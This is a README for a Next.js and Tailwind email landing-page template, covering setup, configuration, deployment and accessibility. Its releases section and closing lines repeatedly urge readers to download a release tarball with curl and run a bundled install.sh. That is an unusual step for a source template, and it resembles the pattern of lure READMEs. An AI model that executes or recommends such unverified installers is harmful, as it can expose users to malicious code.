# Mailgo Template — Modern Email Landing Page with Next.js

[![Releases](https://img.shields.io/badge/Releases-v---blue?logo=github)](https://github.com/xim-cc/Mailgo-template/releases)

Build a fast, secure email landing page with Next.js, Tailwind CSS, and Node. Mailgo Template provides a focused starting point for sites that need email sign-up, contact flows, and integrated mailto handling. The template emphasizes responsive layouts, accessibility, and modern front-end patterns.

![Hero — email landing page](https://source.unsplash.com/1600x900/?email,interface)

## Table of contents
- Features
- Demo & Screenshots
- Quick start
- Releases (download & run)
- Structure
- Configuration
- Development
- Deployment
- Testing & CI
- Performance & SEO tips
- Accessibility
- Contributing
- License
- Credits

## Features
- Email-first landing page template built with Next.js and Tailwind CSS.
- Pre-built components: hero, features, pricing, contact form, footer.
- Serverless API route for form handling (Node / Vercel functions).
- Mailto enhancements for desktop and mobile using a mailgo-style handler.
- Responsive layout across phones, tablets, and desktops.
- Built-in SEO and Open Graph defaults.
- Ready for A/B testing and analytics hooks.
- Minimal dependencies, fast build times.

## Demo & Screenshots
- Live demo: deploy the repo to Vercel or run locally (see Quick start).
- Screenshots show hero with CTA, compact contact modal, and responsive breakpoints.

Screenshots:
- Desktop hero: https://source.unsplash.com/1200x600/?website,landing  
- Mobile contact: https://source.unsplash.com/600x800/?mobile,form

## Quick start
1. Clone the repo
```bash
git clone https://github.com/xim-cc/Mailgo-template.git
cd Mailgo-template
```

2. Install dependencies
```bash
npm install
# or
pnpm install
# or
yarn
```

3. Run development server
```bash
npm run dev
# visit http://localhost:3000
```

4. Build for production
```bash
npm run build
npm run start
```

## Releases (download & run)
Get packaged releases and prebuilt assets on the releases page:
https://github.com/xim-cc/Mailgo-template/releases

Download the release asset for your platform, then run the included installer or extract and follow the bundled README. Example flow for a typical release asset:

```bash
# replace v1.2.0 and filenames with the release you need
curl -L -o mailgo-template-v1.2.0.tar.gz \
  https://github.com/xim-cc/Mailgo-template/releases/download/v1.2.0/mailgo-template-v1.2.0.tar.gz

tar -xzf mailgo-template-v1.2.0.tar.gz
cd mailgo-template-v1.2.0

# if the release includes an installer script
chmod +x install.sh
./install.sh
```

The release page may include ZIP or tar assets and an installer script. Download the relevant file and execute the provided installer or follow the release notes. If the releases link does not work for any reason, check the "Releases" section on the repository page.

## Repository structure
- /app or /pages — Next.js routes and pages
- /components — UI components (Hero, CTA, Modal, Form)
- /styles — Tailwind config and global CSS
- /lib — utilities and helpers (email adapters, mailgo handler)
- /api — serverless API routes for form submission
- /public — static images and icons
- /scripts — build and helper scripts

Files of interest:
- next.config.js — Next.js settings
- tailwind.config.js — Tailwind setup
- postcss.config.js — PostCSS config
- .github/workflows/ci.yml — CI pipeline

## Configuration
Environment variables
- NEXT_PUBLIC_SITE_URL — public site URL
- NEXT_PUBLIC_ANALYTICS_ID — analytics provider ID
- MAILGO_STRICT_MODE — enable stricter mail handler (true/false)
- CONTACT_EMAIL — fallback contact address for serverless form

Example .env.local
```
NEXT_PUBLIC_SITE_URL=https://example.com
NEXT_PUBLIC_ANALYTICS_ID=UA-XXXXXXXXX-X
CONTACT_EMAIL=hello@example.com
MAILGO_STRICT_MODE=false
```

Tailwind
- Configure design tokens in tailwind.config.js
- Add custom fonts in global CSS and _document.js (Next.js)

Form handling
- /api/contact — accepts POST with name, email, message
- The function validates input and forwards to CONTACT_EMAIL or to an SMTP provider (configurable)

Mailgo handler
- The template includes a client-side mailgo-like handler to intercept mailto links and present a rich contact modal on desktop or open native composer on mobile.
- Toggle behavior via MAILGO_STRICT_MODE.

## Development
Component patterns
- Keep components small and focused.
- Use Headless UI or simple ARIA patterns for modal and dropdown components.
- Prefer controlled inputs for forms and validate on both client and server.

Coding style
- Use TypeScript for type safety (optional).
- Follow ESLint and Prettier rules included in the repo.
- Commit hooks run lint and tests.

Example component usage
```jsx
import Hero from '@/components/Hero'
import ContactModal from '@/components/ContactModal'

export default function Home() {
  return (
    <>
      <Hero />
      <ContactModal />
    </>
  )
}
```

Local mail testing
- Use MailHog or Mailtrap for safe email testing.
- Configure SMTP in serverless function or link to a service like SendGrid.

## Deployment
Vercel (recommended for Next.js)
- Connect repo to Vercel.
- Set environment variables in Vercel dashboard.
- Deploy branch main or a release tag.

Docker
- Build a minimal Node image
```dockerfile
FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --production
COPY . .
RUN npm run build
CMD ["npm","start"]
```

Static export
- Use next export for a static-only site.
```bash
npm run build
npm run export
# serve out/ directory
```

CDN & caching
- Use the Next.js image optimization or external CDN for static assets.
- Configure cache-control headers for public assets.

## Testing & CI
- Unit tests with Jest.
- End-to-end tests with Playwright or Cypress for form flows.
- Example GitHub Actions CI:
  - Install deps
  - Run lint
  - Run tests
  - Build
- Push tags to trigger release pipeline.

## Performance & SEO tips
- Pre-render critical pages via getStaticProps where possible.
- Use image optimization and lazy loading.
- Keep bundle size small; prefer native elements and small libraries.
- Add structured data for the landing page (JSON-LD).
- Provide Open Graph and Twitter card meta tags.

## Accessibility
- Ensure form labels link to inputs.
- Provide keyboard focus for modals.
- Use semantic HTML and aria attributes for interactive widgets.
- Test with Lighthouse and screen readers.

## Customization
Branding
- Replace fonts and color token values in tailwind.config.js.
- Update logo in /public and update favicon.

Components
- Hero: modify CTA, image, and headline.
- Contact flow: swap serverless handler to a provider adapter.
- Mailgo behavior: change modal layout, add templates for prefilled subject/body.

Integrations
- Analytics: Segment, Plausible, or Google Analytics.
- Auth: add NextAuth.js if you need user accounts.
- CRM: forward form submissions to HubSpot, Pipedrive, or a webhook.

## Contributing
- Fork the repo.
- Open a feature branch.
- Run tests and lint locally.
- Create pull request with clear description and screenshots if UI changes.

Issue workflow
- Label bugs and feature requests.
- Provide reproduction steps for issues.
- Add tests for any bug fix.

## License
MIT License — see LICENSE file for full terms.

## Credits
- Next.js — framework for React builds
- Tailwind CSS — utility-first CSS
- Node.js — API and tooling
- Icons and images from public sources and Unsplash search queries (used as placeholders)

For packaged releases and binary assets, visit the releases page and download the matching file. Execute the installer provided in each release asset for a quick setup:
https://github.com/xim-cc/Mailgo-template/releases

If you need a tailored integration, add an issue or open a PR with your changes.